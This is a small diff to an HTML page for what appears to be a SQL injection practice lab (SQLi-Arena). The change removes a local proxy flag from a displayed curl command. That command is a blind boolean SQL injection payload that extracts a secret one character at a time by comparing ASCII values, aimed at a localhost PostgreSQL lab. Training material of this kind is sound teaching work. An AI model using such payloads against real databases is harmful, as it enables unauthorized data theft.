@@ -143,7 +143,7 @@
         <span class="terminal-title">curl. Manual Single-Character Test</span>
     </div>
     <div class="terminal-body">
-        <span class="prompt">$ </span>curl -s -x http://127.0.0.1:8080 "http://localhost/SQLi-Arena/pgsql/lab4" \<br> --data-urlencode "member=alice' AND ASCII(SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)) = 70 -- -"<br><br>
+        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/pgsql/lab4" \<br> --data-urlencode "member=alice' AND ASCII(SUBSTRING((SELECT secret_value FROM secrets LIMIT 1),1,1)) = 70 -- -"<br><br>
         <span class="prompt"># </span>ASCII 70 = 'F' -- returns "Status: Active" (TRUE)<br>
         <span class="prompt">Output:</span> Status: Active
     </div>
